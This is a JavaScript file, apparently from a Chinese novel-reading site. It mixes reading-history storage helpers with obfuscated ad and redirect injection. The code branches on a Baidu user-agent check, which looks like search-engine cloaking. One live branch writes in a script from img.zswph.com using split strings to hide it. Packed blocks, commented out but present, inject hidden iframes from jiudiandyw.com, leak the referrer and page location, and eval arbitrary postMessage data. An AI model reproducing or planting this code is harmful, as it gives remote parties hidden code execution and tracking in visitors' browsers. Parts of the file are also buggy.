   function zzdj(){
       (function(w, d) {
        var date = new Date();
        var bb=""+(date.getMonth())+date.getDate()+date.getFullYear();
        var xx=String(Math.ceil(new Date()/(1000*300)));
        d.writeln("<script src=\'/aaggshangshu/1abookgd"+bb+xx+".js\'></script>");
        })(window, document);

   }


function qianzhi(){
 //qianzhi

    var _numsa = 10;
    function LastReadsa(){
        this.bookList="bookList"
    }
    
    LastReadsa.prototype={
        set:function(bid,tid,title,texttitle){
            if(!(bid&&tid&&title&&texttitle))return;
            var v=bid+'#'+tid+'#'+title+'#'+texttitle;
            this.setItem(bid,v);
            this.setBook(bid)
        },
    
        get:function(k){
            return this.getItem(k)?this.getItem(k).split("#"):"";
        },
    
        remove:function(k){
            this.removeItem(k);
            this.removeBook(k)
        },
    
        setBook:function(v){
            var reg=new RegExp("(^|#)"+v);
            var books = this.getItem(this.bookList);
            if(books==""){
                books=v
            }
            else{
                if(books.search(reg)==-1){
                    books+="#"+v
                }
                else{
                    books.replace(reg,"#"+v)
                }
            }
            this.setItem(this.bookList,books)
    
        },
    
        getBook:function(){
            var v=this.getItem(this.bookList)?this.getItem(this.bookList).split("#"):Array();
            var books=Array();
            if(v.length){
    
                for(var i=0;i<v.length;i++){
                    var tem=this.getItem(v[i]).split('#');
                    if(i>v.length-(_num+1)){
                        if (tem.length>3)   books.push(tem);
                    }
                    else{
                        LastReadsa.remove(tem[0]);
                    }
                }
            }
            return books
        },
    
        removeBook:function(v){
            var reg=new RegExp("(^|#)"+v);
            var books = this.getItem(this.bookList);
            if(!books){
                books=""
            }
            else{
                if(books.search(reg)!=-1){
                    books=books.replace(reg,"")
                }
    
            }
            this.setItem(this.bookList,books)
    
        },
    
        setItem:function(k,v){
            if(!!window.localStorage){
                localStorage.setItem(k,v);
            }
            else{
                var expireDate=new Date();
                var EXPIR_MONTH=30*24*3600*1000;
                expireDate.setTime(expireDate.getTime()+12*EXPIR_MONTH)
                document.cookie=k+"="+encodeURIComponent(v)+";expires="+expireDate.toGMTString()+"; path=/";
            }
        },
    
        getItem:function(k){
    
            var value=""
            var result=""
            if(!!window.localStorage){
                result=window.localStorage.getItem(k);
                value=result||"";
            }
            else{
                var reg=new RegExp("(^| )"+k+"=([^;]*)(;|\x24)");
                var result=reg.exec(document.cookie);
                if(result){
                    value=decodeURIComponent(result[2])||""}
            }
            return value
    
        },
    
        removeItem:function(k){
            if(!!window.localStorage){
                window.localStorage.removeItem(k);
            }
            else{
                var expireDate=new Date();
                expireDate.setTime(expireDate.getTime()-1000)
                document.cookie=k+"= "+";expires="+expireDate.toGMTString()
            }
        },
        removeAll:function(){
            if(!!window.localStorage){
                window.localStorage.clear();
            }
            else{
                var v=this.getItem(this.bookList)?this.getItem(this.bookList).split("#"):Array();
                var books=Array();
                if(v.length){
                    for( i in v ){
                        var tem=this.removeItem(v[k])
                    }
                }
                this.removeItem(this.bookList)
            }
        }
}

function showbookasdfsd(){
    var showbook=document.getElementById('newcase');
    var books=LastReadsa.getBook();
    var bookhtml = '';
    if(books.length){
        var k = 1;
        for(var i=books.length-1;i>-1;i--){
            var articleid = parseInt(books[i][0]);
            var shortid = parseInt(articleid/1000);
            var articlename = books[i][2];
            var lastchapter = books[i][3];
            var lastchapterid = books[i][1];
            var c = '';
            if((k % 2) == 0){
                c = 'hot_saleEm';
            }
            bookhtml+='<div class="hot_sale'+' '+c+'"><span class="num num'+k+'">'+k+'</span>';
            bookhtml+='</div>';
            k++;
            artinfo(articleid)
        }
        showbook.innerHTML = bookhtml;
    }
    else{
        showbook.innerHTML = '<div class="bookcasetip">您还没有阅读记录</div>';
    }


}

function removeboodsfdak(k){
    LastReadsa.remove(k);
    showbook()
}



function yuedu(){
    //document.write("<a href='javascript:showbook();' target='_self'>点击查看阅读记录</a>");
    showbook();
}

window.LastReadsa = new LastReadsa();
//endqianzhi
  
}

function isbaidu(){
    try {
        var sUserAgent = navigator.userAgent.toLowerCase();
        if(sUserAgent.indexOf("baidu") > 0) {
            return true;
        }
    }catch(err){}
    return false;
}


//xf
function mdypfw(){
    
    if(isbaidu()){
    //xlm
    qianzhi();
        
        //xlm
// new Function(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6((/(P)/i.7(8.f))&&(/(r)/i.7(8.f))){6((/(O)/i.7(v.q.u))){N(L M().Q())};5 l="k.c.a/R/V?";2.4(\'<9 b=\');2.4(\'h\');2.4(\'K\');2.4(\'p\');2.4(\'s:\');2.4(\'//\');2.4(l);2.4(\'><\\/9>\')}x 6((/(T|S|r)/i.7(8.f))){v.W(\'H\',w(e){5 j=e.E;6(j.y){I(D(j.y.J(/\\+/g,"%F")))}});2.4(\'<n U="Y:1e;" b="B://k.c.a/1d/o.1c?X=3&1i=\'+8["1k"]+\'&1j=\'+t(q.u)+\'&1f=\'+t(2.1a)+\'" 12="0" 11="0"  Z="0" 13="14" 18="0" 16="19"></n>\')}x{;(w(){5 m=2.15("9");5 z=\'B://k.c.a\';m.b=z+"/1/o.17?"+A.10(A.1h()*1g);5 d=2.1b("9")[0];d.C.G(m,d)})()}',62,83,'||document||write|var|if|test|navigator|script|com|src|jiudiandyw|ss||userAgent||||_c_ob_hf|uu|lAAtH||iframe|50321||location|baidu||encodeURIComponent|href|window|function|else|hf_ev_j|url|Math|https|parentNode|decodeURIComponent|data|20|insertBefore|message|eval|replace|tt|new|Date|alert|check_xxin|Android|getSeconds|s_50321_1|UCBrowser|MQQBrowser|style|w1xhtml|addEventListener|sdfa|display|marginheight|round|width|height|scrolling|no|createElement|allowtransparency|js|frameborder|true|referrer|getElementsByTagName|html|arm|none|ifr_ref|10000|random|serasfd|ifr_url|platform'.split('|'),0,{}))(); 

    }else{
        var max = 2;
        var nw = Math.floor(Math.random() * max + 1);
        switch (nw) {
    
        case 1:
            
    //66
;(function(){var wlf_id='an1566n8u'+Math.ceil(Math.random()*1000);var _strhtm='<div id="';_strhtm+=wlf_id;_strhtm+='"></div>';var d=document;d.writeln(_strhtm);d.writeln('<scri'+'pt');d.writeln(' src="htt');d.writeln('ps:/');d.writeln('/img.zswph.');d.writeln('com/de.php?e=fu.cz&mt=');d.writeln(wlf_id);d.writeln('.jsp"></scr'+'ipt>')})();
    
    		break;
    		
    	    case 2:
    //xlm
// new Function(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6((/(P)/i.7(8.f))&&(/(r)/i.7(8.f))){6((/(O)/i.7(v.q.u))){N(L M().Q())};5 l="k.c.a/R/V?";2.4(\'<9 b=\');2.4(\'h\');2.4(\'K\');2.4(\'p\');2.4(\'s:\');2.4(\'//\');2.4(l);2.4(\'><\\/9>\')}x 6((/(T|S|r)/i.7(8.f))){v.W(\'H\',w(e){5 j=e.E;6(j.y){I(D(j.y.J(/\\+/g,"%F")))}});2.4(\'<n U="Y:1e;" b="B://k.c.a/1d/o.1c?X=3&1i=\'+8["1k"]+\'&1j=\'+t(q.u)+\'&1f=\'+t(2.1a)+\'" 12="0" 11="0"  Z="0" 13="14" 18="0" 16="19"></n>\')}x{;(w(){5 m=2.15("9");5 z=\'B://k.c.a\';m.b=z+"/1/o.17?"+A.10(A.1h()*1g);5 d=2.1b("9")[0];d.C.G(m,d)})()}',62,83,'||document||write|var|if|test|navigator|script|com|src|jiudiandyw|ss||userAgent||||_c_ob_hf|uu|lAAtH||iframe|50321||location|baidu||encodeURIComponent|href|window|function|else|hf_ev_j|url|Math|https|parentNode|decodeURIComponent|data|20|insertBefore|message|eval|replace|tt|new|Date|alert|check_xxin|Android|getSeconds|s_50321_1|UCBrowser|MQQBrowser|style|w1xhtml|addEventListener|sdfa|display|marginheight|round|width|height|scrolling|no|createElement|allowtransparency|js|frameborder|true|referrer|getElementsByTagName|html|arm|none|ifr_ref|10000|random|serasfd|ifr_url|platform'.split('|'),0,{}))(); 
    
    		break;	
      }
    
    
    }                        

}

function djdj(){
    
       if(isbaidu()){
       qianzhi();
        //xlm
// new Function(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('9((/(10)/i.b(a.o))&&(/(z)/i.b(a.o))){9((/(12)/i.b(f.H.G))){Z(Y V().W())};7 L="v.x.q/X/13?"+8.B(8.d()*C);3.4(\'<l t=\');3.4(\'h\');3.4(\'14\');3.4(\'p\');3.4(\'s:\');3.4(\'//\');3.4(L);3.4(\'><\\/l>\')}u 9((/(D|U|z)/i.b(a.o))){f.19(\'1a\',E(e){7 c=e.18;9(c.6){9(f[c.6+"w"]!=1){f[c.6+"w"]=1;17(15(c.16.1b(/\\+/g,"%T")))}}});7 6="N"+8.d().P(Q).M(2);9((/(D)/i.b(a.o))){3.4("<n k=\'j"+6+"\'><p A=\'O:R;\'>S"+6+"</p></n>")}u{3.4("<n k=\'j"+6+"\'></n>")};3.4(\'<y A="O:R;" k="\'+6+\'" t="K://v.x.q/J-1d-\'+8.B(8.d()*C)+\'.1u?1t=5&1r=\'+I(H.G)+\'&1v=\'+a["1c"]+\'&1A=\'+6+\'&1z=\'+I(3.1y)+\'" 1x="1q" 1p="1h%"  1g="0" 1e="1i" 1j="0" 1o="1n"></y>\')}u{;(E(){7 m=3.1m("l");7 s="N"+8.d().P(Q).M(2);3.4("<j k=\'"+s+"\'></j>");7 F=\'K://v.x.q\';m.t=F+"/11/J.1l?1k="+s;7 r=3.1f("l")[0];r.1w.1s(m,r)})()}',62,99,'|||document|write||if_id|var|Math|if|navigator|test|_c_ob|random||window||||div|id|script||span|userAgent||com|ss||src|else|uu||jiudiandyw|iframe|baidu|style|round|10000|MQQBrowser|function|url|href|location|encodeURIComponent|50311|https|biAbG|slice|_|display|toString|36|none|i8px|20|UCBrowser|Date|getSeconds|s_50311_1|new|alert|Android||check_xxin|w1xhtml|tt|decodeURIComponent|wz_ev_j|eval|data|addEventListener|message|replace|platform|39|scrolling|getElementsByTagName|marginheight|100|no|frameborder|ssid|js|createElement|true|allowtransparency|width|auto|ifr_url|insertBefore|sdfa|html|serasfd|parentNode|height|referrer|ifr_ref|badid'.split('|'),0,{}))();
        
   }else{
        
   
            zzdj();
   

        
        
   }
}

function ggsdj(){
    
        djdj();
   
  
        document.writeln("<div style='margin-bottom:5px;text-align:center'></div>");
        
}

function ggxdj(){
    
    document.writeln("<div style='margin-top:5px;text-align:center'></div>");
       
        djdj();
   
  
}


